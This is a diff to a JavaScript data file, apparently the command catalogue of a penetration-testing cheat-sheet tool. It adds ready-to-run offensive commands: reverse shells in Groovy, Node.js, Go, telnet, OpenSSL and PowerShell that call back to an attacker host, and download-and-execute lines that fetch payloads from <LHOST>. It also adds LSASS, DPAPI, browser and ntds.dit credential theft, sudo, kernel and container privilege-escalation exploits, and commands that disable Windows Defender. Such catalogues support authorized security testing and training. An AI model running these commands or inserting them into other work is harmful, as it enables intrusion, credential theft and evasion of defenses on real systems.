@@ -196,6 +196,13 @@ module.exports = [
           { title: "TestSSL Vulnerabilities Only", desc: "Test for known SSL vulnerabilities only", cmd: "testssl.sh --vulnerable https://<TARGET_IP>", tags: ["tool"] },
           { title: "Nmap SSL Enum Ciphers", desc: "Enumerate SSL/TLS ciphers and protocols", cmd: "nmap --script ssl-enum-ciphers -p 443 -Pn <TARGET_IP>", tags: ["essential"] },
           { title: "Nmap SSL Certificate Info", desc: "Extract SSL certificate details", cmd: "nmap --script ssl-cert -p 443 -Pn <TARGET_IP>", tags: ["essential"] },
+          { title: "Nmap SSH Brute Force", desc: "Brute force SSH via NSE", cmd: "nmap --script ssh-brute -p 22 -Pn <TARGET_IP>", tags: ["tool"] },
+          { title: "Nmap FTP Bounce Check", desc: "Check for FTP bounce attack", cmd: "nmap --script ftp-bounce -p 21 -Pn <TARGET_IP>", tags: ["tool"] },
+          { title: "Nmap SMTP Open Relay", desc: "Check for open SMTP relay", cmd: "nmap --script smtp-open-relay -p 25 -Pn <TARGET_IP>", tags: ["tool"] },
+          { title: "Nmap NFS Enumeration", desc: "Enumerate NFS exports and permissions", cmd: "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 -Pn <TARGET_IP>", tags: ["essential"] },
+          { title: "Nmap MySQL Audit", desc: "Run MySQL audit and empty password check", cmd: "nmap --script mysql-empty-password,mysql-info,mysql-enum -p 3306 -Pn <TARGET_IP>", tags: ["essential"] },
+          { title: "Nmap LDAP RootDSE", desc: "Query LDAP root DSE for domain info", cmd: "nmap --script ldap-rootdse -p 389 -Pn <TARGET_IP>", tags: ["essential"] },
+          { title: "Nmap DNS Brute Force", desc: "Brute force DNS subdomains via NSE", cmd: "nmap --script dns-brute --script-args dns-brute.domain=<DOMAIN> -Pn <TARGET_IP>", tags: ["tool"] },
         ]
       },
       {
@@ -750,6 +757,11 @@ module.exports = [
           { title: "Socat Encrypted Reverse Shell", desc: "Socat reverse shell over encrypted channel", cmd: "socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", tags: ["advanced"] },
           { title: "Lua Reverse Shell", desc: "Lua one-liner reverse shell", cmd: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('<LHOST>','<LPORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');\"", tags: ["advanced"] },
           { title: "Awk Reverse Shell", desc: "AWK reverse shell one-liner", cmd: "awk 'BEGIN {s = \"/inet/tcp/0/<LHOST>/<LPORT>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null", tags: ["advanced"] },
+          { title: "Groovy Reverse Shell", desc: "Groovy reverse shell for Jenkins Script Console", cmd: "String host='<LHOST>';int port=<LPORT>;String cmd='/bin/bash';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close()", tags: ["advanced"], note: "Use in Jenkins Groovy Script Console" },
+          { title: "Node.js Reverse Shell", desc: "Node.js one-liner reverse shell", cmd: "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/bash\",[]);var client=new net.Socket();client.connect(<LPORT>,\"<LHOST>\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})()'", tags: ["advanced"] },
+          { title: "Golang Reverse Shell", desc: "Go language reverse shell (compile on attacker)", cmd: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"<LHOST>:<LPORT>\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go build -o /tmp/rs /tmp/rs.go && /tmp/rs", tags: ["advanced"] },
+          { title: "Telnet Reverse Shell", desc: "Reverse shell using telnet", cmd: "TF=$(mktemp -u);mkfifo $TF && telnet <LHOST> <LPORT> 0<$TF | /bin/sh 1>$TF", tags: ["essential"] },
+          { title: "OpenSSL Reverse Shell", desc: "Encrypted reverse shell via OpenSSL", cmds: ["# On attacker: openssl s_server -quiet -key key.pem -cert cert.pem -port <LPORT>", "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <LHOST>:<LPORT> > /tmp/s; rm /tmp/s"], tags: ["advanced"] },
         ]
       },
       {
@@ -761,6 +773,9 @@ module.exports = [
           { title: "Nishang Invoke-PowerShellTcp", desc: "Nishang reverse shell module", cmd: "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>\"", tags: ["tool"] },
           { title: "ConPtyShell (Full Interactive)", desc: "Fully interactive Windows reverse shell", cmds: ["# On attacker:", "stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>", "# On target (PowerShell):", "IEX(IWR http://<LHOST>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>"], tags: ["advanced", "tool"] },
           { title: "Windows Netcat Reverse Shell", desc: "Netcat reverse shell on Windows", cmd: "nc.exe -e cmd.exe <LHOST> <LPORT>", tags: ["essential"] },
+          { title: "PowerShell Reverse Shell (Compact)", desc: "Shorter PowerShell reverse shell one-liner", cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\"", tags: ["essential"] },
+          { title: "PowerShell RunspacePool Shell", desc: "Reverse shell using RunspacePool for stealth", cmd: "powershell -nop -c \"$r=[RunspaceFactory]::CreateRunspace();$r.Open();$p=[PowerShell]::Create();$p.Runspace=$r;$p.AddScript({$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}});$p.Invoke()\"", tags: ["advanced"] },
+          { title: "PowerCat Reverse Shell", desc: "PowerShell netcat reverse shell module", cmd: "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e cmd.exe\"", tags: ["tool"] },
         ]
       },
       {
@@ -873,6 +888,18 @@ module.exports = [
           { title: "Check SeBackupPrivilege", desc: "Check for backup privilege (read any file)", cmd: "whoami /priv | findstr /i \"SeBackup\"", tags: ["essential"] },
           { title: "Check SeRestorePrivilege", desc: "Check for restore privilege (write any file)", cmd: "whoami /priv | findstr /i \"SeRestore\"", tags: ["essential"] },
           { title: "Check SeDebugPrivilege", desc: "Check for debug privilege (access any process)", cmd: "whoami /priv | findstr /i \"SeDebug\"", tags: ["advanced"] },
+          { title: "SeDebugPrivilege Exploit (Mimikatz)", desc: "Dump LSASS with debug privilege", cmd: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"", tags: ["advanced", "tool"], note: "SeDebugPrivilege allows reading any process memory" },
+          { title: "SeDebugPrivilege Procdump LSASS", desc: "Dump LSASS process memory with procdump", cmd: "procdump.exe -ma lsass.exe lsass.dmp -accepteula", tags: ["advanced", "tool"], note: "Analyze dump offline with pypykatz or mimikatz" },
+          { title: "SeBackupPrivilege File Read", desc: "Read any file using backup privilege", cmds: ["Import-Module .\\SeBackupPrivilegeUtils.dll", "Import-Module .\\SeBackupPrivilegeCmdLets.dll", "Copy-FileSeBackupPrivilege C:\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit"], tags: ["advanced"] },
+          { title: "SeRestorePrivilege DLL Hijack", desc: "Write to any location using restore privilege", cmd: "# SeRestorePrivilege allows writing any file - use to overwrite service DLLs or system binaries", tags: ["advanced"], note: "Write a malicious DLL to a system path, then trigger the service" },
+          { title: "SeTakeOwnershipPrivilege", desc: "Take ownership of any file and read it", cmds: ["takeown /f C:\\path\\to\\sensitive\\file", "icacls C:\\path\\to\\sensitive\\file /grant <USER>:F", "type C:\\path\\to\\sensitive\\file"], tags: ["advanced"] },
+          { title: "Check All Privileges", desc: "List all current token privileges with status", cmd: "whoami /priv", tags: ["essential"] },
+          { title: "Get-Acl Check Permissions", desc: "Check ACL permissions on a file or directory", cmd: "powershell -c \"Get-Acl 'C:\\path\\to\\file' | Format-List\"", tags: ["essential"] },
+          { title: "Get-Acl Service Registry", desc: "Check permissions on service registry key", cmd: "powershell -c \"Get-Acl 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<SERVICE_NAME>' | Format-List\"", tags: ["tool"] },
+          { title: "icacls Check File Permissions", desc: "Check detailed file ACL permissions", cmd: "icacls \"C:\\path\\to\\file\"", tags: ["essential"] },
+          { title: "icacls Check Program Files", desc: "Find writable directories in Program Files", cmd: "icacls \"C:\\Program Files\" /T /C 2>nul | findstr /i \"(F) (M) (W) Everyone Users BUILTIN\"", tags: ["essential"] },
+          { title: "icacls Check Service Binaries", desc: "Check if service binary path is writable", cmd: "for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> services.txt & icacls \"%a\" 2>nul", tags: ["advanced"] },
+          { title: "EfsPotato", desc: "Exploit SeImpersonate via EFS service", cmd: "EfsPotato.exe \"C:\\temp\\shell.exe\"", tags: ["tool"], note: "Works on Windows 10/Server 2016-2019" },
         ]
       },
       {
@@ -886,6 +913,16 @@ module.exports = [
           { title: "Copy SAM with Shadow Copies", desc: "Extract SAM via volume shadow copies", cmds: ["wmic shadowcopy list brief", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\SAM", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM"], tags: ["advanced"] },
           { title: "IIS Web.config Credentials", desc: "Check IIS configuration for credentials", cmd: "type C:\\inetpub\\wwwroot\\web.config | findstr /i connectionString password", tags: ["essential"] },
           { title: "Search Registry for Passwords", desc: "Search registry for password entries", cmd: "reg query HKLM /f password /t REG_SZ /s", tags: ["essential"] },
+          { title: "DPAPI Credential Files", desc: "Find DPAPI-protected credential files", cmd: "dir /s /b C:\\Users\\*\\AppData\\*\\Microsoft\\Credentials\\*", tags: ["advanced"] },
+          { title: "DPAPI Master Keys Location", desc: "Find DPAPI master key files", cmd: "dir /s /b C:\\Users\\*\\AppData\\*\\Microsoft\\Protect\\*", tags: ["advanced"] },
+          { title: "Mimikatz DPAPI Decrypt", desc: "Decrypt DPAPI blobs with mimikatz", cmd: "mimikatz.exe \"dpapi::cred /in:C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials\\<CRED_FILE>\" \"exit\"", tags: ["advanced", "tool"] },
+          { title: "SharpDPAPI Triage", desc: "Automated DPAPI credential extraction", cmd: "SharpDPAPI.exe triage", tags: ["advanced", "tool"] },
+          { title: "Find KeePass Database Files", desc: "Search for KeePass database files", cmd: "dir /s /b C:\\*.kdbx 2>nul", tags: ["essential"] },
+          { title: "Find SSH Keys (Windows)", desc: "Search for SSH private keys on Windows", cmd: "dir /s /b C:\\Users\\*\\.ssh\\id_rsa 2>nul", tags: ["essential"] },
+          { title: "Saved RDP Credentials", desc: "Check for saved RDP connection credentials", cmd: "dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\* 2>nul", tags: ["tool"] },
+          { title: "Find Configuration Files", desc: "Search for config files with potential credentials", cmd: "dir /s /b C:\\*.config C:\\*.ini C:\\*.xml C:\\*.json 2>nul | findstr /i /v \"Windows\\\\assembly Windows\\\\Microsoft.NET\"", tags: ["essential"] },
+          { title: "Browser Saved Passwords (SharpChromium)", desc: "Extract saved browser passwords", cmd: "SharpChromium.exe logins", tags: ["tool"] },
+          { title: "Snaffler Credential Finder", desc: "Automated credential and secret finder across shares", cmd: "Snaffler.exe -s -o snaffler_output.txt", tags: ["tool"] },
         ]
       },
       {
@@ -915,6 +952,13 @@ module.exports = [
           { title: "Seatbelt", desc: "Security-focused host survey tool", cmd: "Seatbelt.exe -group=all", tags: ["tool"] },
           { title: "SharpUp", desc: "C# port of PowerUp privesc checks", cmd: "SharpUp.exe audit", tags: ["tool"] },
           { title: "PrivescCheck", desc: "PowerShell privilege escalation enumeration", cmds: ["Import-Module .\\PrivescCheck.ps1", "Invoke-PrivescCheck -Extended"], tags: ["tool"] },
+          { title: "Seatbelt Specific Checks", desc: "Run Seatbelt with targeted security checks", cmd: "Seatbelt.exe -group=user -group=system", tags: ["tool"] },
+          { title: "Seatbelt Remote Execution", desc: "Run Seatbelt against a remote host", cmd: "Seatbelt.exe -group=remote -computername=<TARGET_HOSTNAME> -username=<DOMAIN>\\<USER> -password=<PASS>", tags: ["advanced", "tool"] },
+          { title: "SharpUp Specific Checks", desc: "Run SharpUp with specific vulnerability checks", cmd: "SharpUp.exe audit HijackablePaths ModifiableServiceBinaries ModifiableServices", tags: ["tool"] },
+          { title: "JAWS Enumeration", desc: "Just Another Windows (Enum) Script", cmd: "powershell -ep bypass -c \"Import-Module .\\jaws-enum.ps1\"", tags: ["tool"] },
+          { title: "Windows Exploit Suggester NG", desc: "Suggest exploits from systeminfo (Python)", cmd: "python wes.py systeminfo.txt -e", tags: ["essential", "tool"], note: "Use: systeminfo > systeminfo.txt, then transfer to attacker" },
+          { title: "WinPEAS Services Info", desc: "WinPEAS focused on service misconfigurations", cmd: "winPEASx64.exe quiet servicesinfo", tags: ["tool"] },
+          { title: "WinPEAS Network Info", desc: "WinPEAS focused on network information", cmd: "winPEASx64.exe quiet networkinfo", tags: ["tool"] },
         ]
       }
     ]
@@ -987,6 +1031,13 @@ module.exports = [
           { title: "LD_PRELOAD Escalation", desc: "Abuse LD_PRELOAD in sudo configuration", cmds: ["echo '#include <stdio.h>\\n#include <stdlib.h>\\nvoid _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash\");}' > /tmp/pe.c", "gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles", "sudo LD_PRELOAD=/tmp/pe.so <ALLOWED_COMMAND>"], tags: ["advanced"], note: "Only works if env_keep contains LD_PRELOAD" },
           { title: "LD_LIBRARY_PATH Escalation", desc: "Abuse LD_LIBRARY_PATH in sudo configuration", cmds: ["ldd <SUID_OR_SUDO_BINARY>", "# Create malicious shared library matching a linked .so", "gcc -fPIC -shared -o /tmp/libfoo.so /tmp/evil.c", "sudo LD_LIBRARY_PATH=/tmp <ALLOWED_COMMAND>"], tags: ["advanced"] },
           { title: "CVE-2021-3156 (Baron Samedit)", desc: "Sudo heap overflow affecting versions < 1.9.5p2", cmd: "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')", tags: ["advanced"], note: "Affects sudo versions 1.8.2-1.8.31p2, 1.9.0-1.9.5p1" },
+          { title: "Sudo CVE-2019-14287 (Run as -1)", desc: "Bypass sudo runas restriction with UID -1", cmd: "sudo -u#-1 /bin/bash", tags: ["advanced"], note: "Works when sudoers has (ALL, !root) - sudo < 1.8.28" },
+          { title: "Sudo NOPASSWD Abuse", desc: "Check for NOPASSWD entries in sudo -l", cmd: "sudo -l 2>/dev/null | grep -i 'NOPASSWD'", tags: ["essential"], note: "Any NOPASSWD entry is a potential escalation vector" },
+          { title: "Sudo apache2 Shell", desc: "Root shell via sudo apache2", cmd: "sudo apache2 -f /etc/shadow", tags: ["tool"], note: "Leaks shadow file contents in error message" },
+          { title: "Sudo Node.js Shell", desc: "Root shell via sudo node", cmd: "sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'", tags: ["tool"] },
+          { title: "Sudo Docker Shell", desc: "Root shell via sudo docker", cmd: "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh", tags: ["essential"] },
+          { title: "Sudo Mysql Shell", desc: "Root shell via sudo mysql", cmd: "sudo mysql -e '\\! /bin/bash'", tags: ["tool"] },
+          { title: "Sudo SSH-Keygen Shell", desc: "Read files via sudo ssh-keygen", cmd: "sudo ssh-keygen -D ./lib.so", tags: ["advanced"], note: "Create a malicious shared library" },
         ]
       },
       {
@@ -1030,6 +1081,11 @@ module.exports = [
           { title: "DirtyCow (CVE-2016-5195)", desc: "Kernel exploit for race condition in memory management", cmd: "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty newpassword", tags: ["advanced"], note: "Affects Linux kernel < 4.8.3" },
           { title: "PwnKit (CVE-2021-4034)", desc: "Polkit pkexec local privilege escalation", cmd: "gcc pwnkit.c -o pwnkit && ./pwnkit", tags: ["advanced"], note: "Affects most Linux distros with polkit installed (2009-2022)" },
           { title: "Check Kernel Version for Exploits", desc: "Quick kernel version identification", cmd: "uname -r", tags: ["essential"] },
+          { title: "CVE-2022-2588 (DirtyCred)", desc: "Kernel exploit using credential swapping", cmd: "gcc dirtycred.c -o dirtycred && ./dirtycred", tags: ["advanced"], note: "Affects Linux kernel >= 5.8" },
+          { title: "CVE-2023-0386 (OverlayFS)", desc: "OverlayFS privilege escalation", cmd: "gcc exploit.c -o exploit && ./exploit", tags: ["advanced"], note: "Affects Linux kernel < 6.2" },
+          { title: "CVE-2023-32233 (Netfilter)", desc: "Netfilter nf_tables use-after-free", cmd: "gcc netfilter_exploit.c -o nf_exploit -lnftnl -lmnl && ./nf_exploit", tags: ["advanced"], note: "Affects Linux kernel 5.1 to 6.3.1" },
+          { title: "Check Sudo Version for CVEs", desc: "Check sudo version for known vulnerabilities", cmd: "sudo --version", tags: ["essential"] },
+          { title: "Check Polkit Version", desc: "Check for PwnKit vulnerability", cmd: "pkexec --version", tags: ["essential"], note: "Versions before 0.120 are vulnerable to CVE-2021-4034" },
         ]
       },
       {
@@ -1041,6 +1097,13 @@ module.exports = [
           { title: "LXD Group Escape", desc: "Exploit lxd group membership for root", cmds: ["lxc image import alpine.tar.gz --alias alpine", "lxc init alpine privesc -c security.privileged=true", "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true", "lxc start privesc", "lxc exec privesc /bin/sh"], tags: ["essential"], note: "Need to upload alpine image to target first" },
           { title: "Check Container Environment", desc: "Determine if running inside a container", cmds: ["cat /proc/1/cgroup 2>/dev/null | grep -i docker", "ls -la /.dockerenv 2>/dev/null", "hostname"], tags: ["essential"] },
           { title: "Privileged Container Escape", desc: "Escape from privileged Docker container", cmds: ["mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape", "echo 1 > /tmp/escape/notify_on_release", "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)", "echo \"$host_path/cmd\" > /tmp/escape/release_agent", "echo '#!/bin/bash' > /cmd", "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /cmd", "chmod +x /cmd", "sh -c 'echo 0 > /tmp/escape/cgroup.procs'"], tags: ["advanced"] },
+          { title: "Docker Group Escape (Named Image)", desc: "Escape via docker group with specific image", cmd: "docker run -it --rm -v /:/mnt alpine chroot /mnt bash", tags: ["essential"] },
+          { title: "Docker Writable Socket Check", desc: "Check if Docker socket is writable", cmd: "ls -la /var/run/docker.sock", tags: ["essential"] },
+          { title: "LXD Group Escape (Quick)", desc: "Quick LXD escape if already initialized", cmds: ["lxc init ubuntu:20.04 privesc -c security.privileged=true", "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true", "lxc start privesc", "lxc exec privesc -- /bin/bash"], tags: ["essential"] },
+          { title: "LXD Import Alpine Image", desc: "Download and import Alpine image for LXD escape", cmds: ["# On attacker: download alpine lxd image from https://github.com/saghul/lxd-alpine-builder", "# Transfer to target", "lxc image import alpine-v3.13-x86_64.tar.gz --alias alpine"], tags: ["essential"] },
+          { title: "Check Group Memberships", desc: "Check if user belongs to docker, lxd, or disk groups", cmd: "id | grep -oP '\\(docker\\)|\\(lxd\\)|\\(disk\\)|\\(adm\\)'", tags: ["essential"] },
+          { title: "Disk Group Abuse", desc: "Read raw filesystem if in disk group", cmd: "debugfs /dev/sda1 -R 'cat /etc/shadow'", tags: ["advanced"], note: "Disk group allows raw access to block devices" },
+          { title: "ADM Group Log Access", desc: "Read sensitive logs if in adm group", cmd: "find /var/log -readable -type f 2>/dev/null | xargs grep -li 'password\\|pass\\|credential' 2>/dev/null", tags: ["tool"] },
         ]
       },
       {
@@ -1060,6 +1123,10 @@ module.exports = [
           { title: "LinEnum", desc: "Linux enumeration and privilege escalation script", cmd: "chmod +x LinEnum.sh && ./LinEnum.sh -t", tags: ["tool"] },
           { title: "Pspy Process Monitor", desc: "Monitor processes without root privileges", cmd: "./pspy64", tags: ["essential", "tool"], note: "Excellent for finding cron jobs and hidden processes" },
           { title: "Linux Smart Enumeration", desc: "Smart Linux enumeration tool", cmd: "chmod +x lse.sh && ./lse.sh -l 2", tags: ["tool"] },
+          { title: "LinPEAS Specific Checks", desc: "Run LinPEAS with specific check categories", cmd: "./linpeas.sh -a -s -e", tags: ["tool"], note: "-a=all, -s=superfast, -e=extra checks" },
+          { title: "LinPrivChecker", desc: "Linux privilege checker script", cmd: "python linprivchecker.py -w linprivchecker_output.txt", tags: ["tool"] },
+          { title: "SUITECase Priv Checker", desc: "Simple Unix privilege escalation checker", cmd: "bash unix-privesc-check standard", tags: ["tool"] },
+          { title: "GTFOBins Lookup", desc: "Manual lookup for binary exploitation", cmd: "# Visit https://gtfobins.github.io/ and search for the SUID/sudo binary", tags: ["essential"], note: "Always check GTFOBins for any unusual SUID binary or sudo permission" },
         ]
       }
     ]
@@ -1305,6 +1372,11 @@ module.exports = [
           { title: "Cscript Execution", desc: "Execute script via cscript", cmd: "cscript //nologo C:\\temp\\payload.vbs", tags: ["essential"] },
           { title: "Chameleon Python Obfuscator", desc: "Obfuscate Python scripts for AV evasion", cmd: "python3 chameleon.py -f payload.py -o obfuscated.py", tags: ["advanced", "tool"] },
           { title: "Nimcrypt2 PE Packer", desc: "Pack and encrypt PE with Nim loader", cmd: "nimcrypt2 -f shell.exe -t csharp -o packed.exe", tags: ["advanced", "tool"] },
+          { title: "Regsvr32 AppLocker Bypass", desc: "Execute COM scriptlet via regsvr32", cmd: "regsvr32 /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll", tags: ["advanced"], note: "Host .sct file on attacker with embedded VBScript/JScript" },
+          { title: "XSL Script Processing", desc: "Execute code via WMIC XSL transform", cmd: "wmic os get /FORMAT:\"http://<LHOST>/payload.xsl\"", tags: ["advanced"] },
+          { title: "Disable Windows Defender (Admin)", desc: "Disable real-time protection if admin", cmd: "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"", tags: ["essential"], note: "Requires local admin privileges" },
+          { title: "Add Defender Exclusion Path", desc: "Add exclusion to avoid scanning payload directory", cmd: "powershell -c \"Add-MpPreference -ExclusionPath 'C:\\Temp'\"", tags: ["essential"], note: "Requires local admin privileges" },
+          { title: "Add Defender Exclusion Process", desc: "Exclude a process from Defender scanning", cmd: "powershell -c \"Add-MpPreference -ExclusionProcess 'payload.exe'\"", tags: ["tool"] },
         ]
       }
     ]
@@ -1510,7 +1582,33 @@ module.exports = [
           { title: "HTTP Directory Scanner", cmds: ["use auxiliary/scanner/http/dir_scanner", "set RHOSTS <TARGET_IP>", "set THREADS 10", "run"], tags: ["tool"], desc: "Scan for common directories on web servers" },
           { title: "SNMP Community Scanner", cmds: ["use auxiliary/scanner/snmp/snmp_enum", "set RHOSTS <TARGET_RANGE>", "run"], tags: ["tool"], desc: "Enumerate SNMP community strings and information" },
           { title: "VNC None Auth Scanner", cmds: ["use auxiliary/scanner/vnc/vnc_none_auth", "set RHOSTS <TARGET_RANGE>", "run"], tags: ["tool"], desc: "Scan for VNC servers with no authentication" },
-          { title: "MSSQL Login Scanner", cmds: ["use auxiliary/scanner/mssql/mssql_login", "set RHOSTS <TARGET_IP>", "set USERNAME sa", "set PASS_FILE /usr/share/wordlists/rockyou.txt", "run"], tags: ["tool"], desc: "Brute force Microsoft SQL Server credentials" }
+          { title: "MSSQL Login Scanner", cmds: ["use auxiliary/scanner/mssql/mssql_login", "set RHOSTS <TARGET_IP>", "set USERNAME sa", "set PASS_FILE /usr/share/wordlists/rockyou.txt", "run"], tags: ["tool"], desc: "Brute force Microsoft SQL Server credentials" },
+          { title: "HTTP Login Brute Force", cmds: ["use auxiliary/scanner/http/http_login", "set RHOSTS <TARGET_IP>", "set AUTH_URI /admin/", "set USER_FILE users.txt", "set PASS_FILE /usr/share/wordlists/rockyou.txt", "run"], tags: ["tool"], desc: "Brute force HTTP Basic/Digest authentication" },
+          { title: "MySQL Login Scanner", cmds: ["use auxiliary/scanner/mysql/mysql_login", "set RHOSTS <TARGET_IP>", "set USERNAME root", "set PASS_FILE /usr/share/wordlists/rockyou.txt", "run"], tags: ["tool"], desc: "Brute force MySQL credentials" },
+          { title: "NFS Share Scanner", cmds: ["use auxiliary/scanner/nfs/nfsmount", "set RHOSTS <TARGET_RANGE>", "run"], tags: ["tool"], desc: "Scan for NFS shares across the network" },
+          { title: "SMTP User Enum", cmds: ["use auxiliary/scanner/smtp/smtp_enum", "set RHOSTS <TARGET_IP>", "set USER_FILE /usr/share/seclists/Usernames/Names/names.txt", "run"], tags: ["tool"], desc: "Enumerate users via SMTP VRFY/EXPN/RCPT" },
+          { title: "RDP BlueKeep Scanner", cmds: ["use auxiliary/scanner/rdp/cve_2019_0708_bluekeep", "set RHOSTS <TARGET_RANGE>", "run"], tags: ["tool"], desc: "Scan for CVE-2019-0708 BlueKeep vulnerability" },
+          { title: "HTTP WordPress Scanner", cmds: ["use auxiliary/scanner/http/wordpress_scanner", "set RHOSTS <TARGET_IP>", "set TARGETURI /wordpress/", "run"], tags: ["tool"], desc: "Scan WordPress installations for common issues" },
+          { title: "IPMI Hash Dumper", cmds: ["use auxiliary/scanner/ipmi/ipmi_dumphashes", "set RHOSTS <TARGET_IP>", "run"], tags: ["tool"], desc: "Dump IPMI password hashes (RAKP authentication)" }
+        ]
+      },
+      {
+        name: "Post-Exploitation Modules",
+        commands: [
+          { title: "Windows Gather Credentials", cmd: "run post/windows/gather/credentials/credential_collector", tags: ["tool"], desc: "Collect various credentials from the target" },
+          { title: "Windows Enum Applications", cmd: "run post/windows/gather/enum_applications", tags: ["tool"], desc: "Enumerate installed applications on Windows target" },
+          { title: "Windows Enum Services", cmd: "run post/windows/gather/enum_services", tags: ["tool"], desc: "Enumerate running services on Windows target" },
+          { title: "Windows Enum Patches", cmd: "run post/windows/gather/enum_patches", tags: ["tool"], desc: "Enumerate installed patches and hotfixes" },
+          { title: "Windows Check VM", cmd: "run post/windows/gather/checkvm", tags: ["tool"], desc: "Detect if target is a virtual machine" },
+          { title: "Windows Enum Domain", cmd: "run post/windows/gather/enum_domain", tags: ["tool"], desc: "Enumerate domain information from Windows target" },
+          { title: "Windows Enum Domain Users", cmd: "run post/windows/gather/enum_ad_users", tags: ["tool"], desc: "Enumerate Active Directory users" },
+          { title: "Windows Enum Domain Groups", cmd: "run post/windows/gather/enum_ad_groups", tags: ["tool"], desc: "Enumerate Active Directory groups" },
+          { title: "Linux Enum Network", cmd: "run post/linux/gather/enum_network", tags: ["tool"], desc: "Enumerate network configuration on Linux target" },
+          { title: "Linux Enum Users/History", cmd: "run post/linux/gather/enum_users_history", tags: ["tool"], desc: "Enumerate users and their command history" },
+          { title: "Linux Hashdump", cmd: "run post/linux/gather/hashdump", tags: ["essential"], desc: "Dump password hashes from /etc/shadow" },
+          { title: "Multi Gather SSH Creds", cmd: "run post/multi/gather/ssh_creds", tags: ["tool"], desc: "Collect SSH keys and known hosts from target" },
+          { title: "Multi Gather Firefox Creds", cmd: "run post/multi/gather/firefox_creds", tags: ["tool"], desc: "Extract saved passwords from Firefox profiles" },
+          { title: "Multi Manage Autoroute", cmd: "run post/multi/manage/autoroute", tags: ["essential"], desc: "Add routes to internal subnets through the session" },
         ]
       }
     ]
@@ -1561,7 +1659,19 @@ module.exports = [
           { title: "Find Users with Descriptions", cmd: "Get-DomainUser -LDAPFilter '(description=*)' | Select-Object samaccountname, description", tags: ["tool"], desc: "Find users with descriptions that may contain passwords", note: "Descriptions often contain password hints or temporary passwords" },
           { title: "PowerView Find Local Admin Access", cmd: "Find-LocalAdminAccess", tags: ["essential"], desc: "Find machines where the current user has local admin access" },
           { title: "PowerView Get-NetSession", cmd: "Get-NetSession -ComputerName <DC_HOSTNAME>", tags: ["tool"], desc: "Enumerate active sessions on a target computer" },
-          { title: "PowerView Get-NetLoggedon", cmd: "Get-NetLoggedon -ComputerName <TARGET_HOSTNAME>", tags: ["tool"], desc: "Enumerate users logged onto a target computer" }
+          { title: "PowerView Get-NetLoggedon", cmd: "Get-NetLoggedon -ComputerName <TARGET_HOSTNAME>", tags: ["tool"], desc: "Enumerate users logged onto a target computer" },
